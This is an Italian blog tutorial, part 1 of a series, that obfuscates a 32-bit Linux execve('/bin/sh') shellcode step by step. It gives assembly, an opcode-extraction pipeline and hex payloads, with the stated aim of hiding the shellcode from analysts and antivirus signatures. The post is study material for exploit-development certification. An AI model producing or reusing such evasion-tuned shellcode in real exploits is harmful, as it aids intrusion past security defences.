---
layout: post
title: "Come offuscare un semplice shellcode - parte 1"
author: thesp0nge
featured: false
category: [post, offensive]
tags: [shellcode, oscp, exploit, exploit development, code obfuscation]
image:
  feature: fog.jpg
comments: true
share: true
---

Una delle cose che mi è piaciuta di più, mentre preparavo l'esame per
[OSCE](https://codiceinsicuro.it/blog/alcune-lezioni-dal-primo-tentativo-fallito-per-losce/),
esame che devo riprovare in questo inverno, è stata la parte di evasione dagli
anti virus.

Questo ha portato a far nascere il progetto
[Shellerate](https://pypi.org/project/shellerate), di cui ne ho parlato in
[questp
post](https://codiceinsicuro.it/blog/shellerate-un-framework-per-generare-shellcode/).

Oggi parliamo ancora di offuscare uno shellcode, partendo da un esempio
semplice e proseguendo per passi successivi.

(Il codice utilizzato in questo post, e successivi, è presente in [questo
repository Github](https://github.com/thesp0nge/bin_sh_obfuscation)).

## Trivia

Utilizzeremo una macchina virtuale Ubuntu 19.04 e compileremo il nostro
shellcode a 32bit con nasm:

{% highlight sh %}
nasm -f elf32 _nomefile_
ld _nomefile_.o -o _nomefile_ -m elf_i386
{% endhighlight %}

![Come compiliamo i file sorgente]({{site.url}}/assets/images/compile_obfuscation_asm.png)

## Perché offuscare il proprio shellcode?

Il motivo alla base di questa attività è quello di mascherare il codice che
vogliamo inserire all'interno di un exploit, per andare ad far eseguire del
codice arbitrario al nostro processo vittima.

Lo voglio mascherare per un semplice motivo, rendere la vita difficile a chi
analizza il codice dell'exploit o semplicemente per cercare di ingannare il
nostro anti-virus.

## Shellcode di partenza

Lo shellcode di partenza è un semplice execve("/bin/sh", NULL, NULL). Il codice
assembler che la realizza è molto semplice, basta ricordare che nel registro
EAX deve essere il contenuto il numero della system call da utilizzare e che i
registri EBX, ECX ed EDX vanno utilizzati per i parametri da passare alla
chiamata.

In particolare EBX dovra contenere il puntatore alla stringa del comando da
eseguire, stringa che andremo a caricare nello stack; ECX ed EDX dovrebbero
contenere rispettivamente un puntatore alla lista degli argomenti del comando e
un puntatore alle variabili d'ambiente che si intende passare al comando. Nel
nostro caso possiamo risparmiare codice e dare un NULL come valore.

{% highlight asm %}
global _start

section .text

_start:
; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

xor eax, eax
push eax        ; The NULL byte
push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
push 0x6e69622f ; "nib/"
mov ebx, esp    ; EBX now points to "/bin//sh"

xor ecx, ecx
xor edx, edx
mov al, 0xB     ; 11 in decimal
int 0x80
{% endhighlight %}

Per trasformare il mio codice binario in un codice eseguibile che può essere
incluso poi in un exploit, utilizzo questo pipe di comandi che ho recuperato
tempo fa in Internet:

{% highlight sh %}
objdump -d _nomefile_ |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{%endhighlight%}

La nostra shellcode di partenza è questa e non ha byte \x00 che ne
impedirebbero poi l'utilizzo all'atto pratico all'interno di un exploit:

{% highlight sh %}
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
{%endhighlight%}

Qui vediamo la nostra shell originale in esecuzione ed è quello che vogliamo
ottenere da ogni codice offuscato, un prompt di una shell.


## Primo passaggio: code refactoring

Nel primo passaggio di offuscamento, cambio il modo con cui i registri ECX ed
EDX sono inizializzati a 0.

Dopo aver inizializzato a 0 il registro EAX, ne salvo il valore all'interno
dello stack per 3 volte. Il primo sarà per costituire il terminatore di stringa
per il comando "/bin/sh", mentre gli altri due saranno immediatamente consumati
da una POP per inizializzare i registri ECX ed EDX.

{% highlight asm %}
global _start

section .text

_start:
; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

; first rewrite: we change the ecx and edx initialization to zero with push and
; pop right after eax is being set to 0

xor eax, eax
push eax	; The NULL byte
push eax	;
push eax 	;
pop ecx		; ECX set to 0
pop edx		; EDX set to 0

push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
push 0x6e69622f ; "nib/"
mov ebx, esp	; EBX now points to "/bin//sh"

mov al, 0xB	; 11 in decimal
int 0x80
{% endhighlight %}

Codice esadecimale dello shellcode:
{% highlight sh %}
\x31\xc0\x50\x50\x50\x59\x5a\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
{% endhighlight %}


## Secondo passaggio: cambio meccanismo di inizializzazione

Nel secondo passaggio cerchiamo di complicare un po' le cose visto che, come si
può vedere dall'equivalente esadecimale il primo passaggio non ha inciso
particolarmente.

Ora cambiamo il meccanismo con cui inizializziamo a 0 i nostri registri. Usiamo
la matematica per mettere a 0 il registro ECX, caricando un valore costante a
32bit e poi sottraendo lo stesso valore.

Con ECX a 0, possiamo impostare EAX ed EDX a 0 semplicemente invocando
l'istruzione
[MUL](http://www.giobe2000.it/Tutorial/Schede/07-IstruzioniCpu/MUL.asp) che
moltiplica il valore in EAX con il valore passato per argomento, in questo caso
il valore del registro ECX e memorizzando il risultato della moltiplicazione in
EAX ed EDX.

{% highlight asm %}
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

; first rewrite: we change the ecx and edx initialization to zero with push and
; pop right after eax is being set to 0

; second rewrite: we use MOV and SUB to set a register to 0, ECX in this case.
; Than we use MUL to multiply the value in EAX (we don't care which) storing 0 in
; both EAX and EDX

mov ecx, 0xdeadbeef
sub ecx, 0xdeadbeef

mul ecx

push eax	; The NULL byte

push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
push 0x6e69622f ; "nib/"
mov ebx, esp	; EBX now points to "/bin//sh"

mov al, 0xB	; 11 in decimal
int 0x80
{% endhighlight %}

Codice esadecimale dello shellcode:
{% highlight sh %}
\xb9\xef\xbe\xad\xde\x81\xe9\xef\xbe\xad\xde\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
{% endhighlight %}


Come si può vedere, in questo caso lo shellcode che otteniamo ha effettivamente
un aspetto diverso da quello di partenza. La strada è ancora lunca, ma stiamo
iniziando a rendere un po' meno leggibile quello che vogliamo mettere nel
nostro payload.

## Terzo passaggio: usiamo la matematica per /bin/sh

Quello che possiamo cambiare ora è il modo con cui salviamo nello stack il
comando da eseguire. Per ora facciamo delle PUSH passando la codifica
esadecimale di /bin/sh in modo tale che, quando verrà letta dallo stack, che
ricordiamo è una struttura LIFO (Last In First Out), verrà ricostruito in
maniera corretta.

Cambiamo quindi le PUSH in operazioni matematiche per valorizzare il registro
EAX al valore che voglio salvare nello stack. I numeri sono stati scelti a
caso, tranne ovviamente l'ultimo ADD per il quale siamo dovuti atterrare al
valore esagerato. Unico vincolo era quello di non causare un overflow del
registro EAX e di non superare il valore che voglio salvare nello stack per
evitare di dover utilizzare anche una SUB.

Quindi, ad esempio, l'istruzione ```push 0x68732f2f``` diventa:
{%highlight asm%}
mov eax, 0x11223344
add eax, 0x44332211
add eax, 0x11111111
add eax, 0x020cc8c9
push eax
{%endhighlight%}

Alla fine il valore del registro EAX sarà proprio 0x68732f2f.
Il mio shellcode in assembler diventa quindi:

{%highlight asm%}
; https://www.virustotal.com/gui/file/f1436a1ca76847e3425d9127a8829b0109bb8af7bf728352c3edfa886de93677/detection
global _start

section .text

_start:
; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h

; first rewrite: we change the ecx and edx initialization to zero with push and
; pop right after eax is being set to 0

; second rewrite: we use MOV and SUB to set a register to 0, ECX in this case.
; Than we use MUL to multiply the value in EAX (we don't care which) storing 0 in
; both EAX and EDX

mov ecx, 0xdeadbeef
sub ecx, 0xdeadbeef

mul ecx

push eax	; The NULL byte

; third rewrite: we will use math to set the /bin/sh hex encoding into eax and
; then pushing eax into the stack. Please note that after this math, we will need
; to zero EAX again before setting it to 0xb

; push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
mov eax, 0x11223344
add eax, 0x44332211
add eax, 0x11111111
add eax, 0x020cc8c9
push eax

; push 0x6e69622f ; "nib/"
mov eax, 0x1234abcd
add eax, 0x23232323
add eax, 0x12121212
add eax, 0x26FF812D
push eax

; now everything in the stack is setted up. We need to set EAX back to 0.
; Instead of using MUL ECX again, that it is a working method, I want to use math
; for that. I will start from a costant value, I will calculate its NOT and then
; I will put those two values in AND so to have 0 as final result.

mov eax, 0xdeadbeef
and eax, 0x21524110

mov ebx, esp	; EBX now points to "/bin//sh"

mov al, 0xB	; 11 in decimal
int 0x80

{%endhighlight%}

Una volta compilato, ottengo il seguente esadecimale:
{%highlight sh%}
\xb9\xef\xbe\xad\xde\x81\xe9\xef\xbe\xad\xde\xf7\xe1\x50\xb8\x44\x33\x22\x11\x05\x11\x22\x33\x44\x05\x11\x11\x11\x11\x05\xc9\xc8\x0c\x02\x50\xb8\xcd\xab\x34\x12\x05\x23\x23\x23\x23\x05\x12\x12\x12\x12\x05\x2d\x81\xff\x26\x50\xb8\xef\xbe\xad\xde\x25\x10\x41\x52\x21\x89\xe3\xb0\x0b\xcd\x80
{%endhighlight%}

Ad una prima occhiata è nettamente diverso dal codice di partenza anche se non
rappresenta alcuna difficoltà per un qualsiasi membro di un blue team.


## Off by one

Offuscare il codice attraverso il refactoring e la riscrittura creativa di
istruzioni è una cosa estremamente divertente, che ci permette di ripassare il
nostro assembler e che ci permette di costruire un exploit con un payload che
difficilmente verrà rilevato da un approccio solamente basato su signature.

Nella seconda parte, continueremo il lavoro del nostro ufficio degli affari
semplici e andremo a complicare ancora di più il codice assembler della nostra
execve.

Enjoy it!
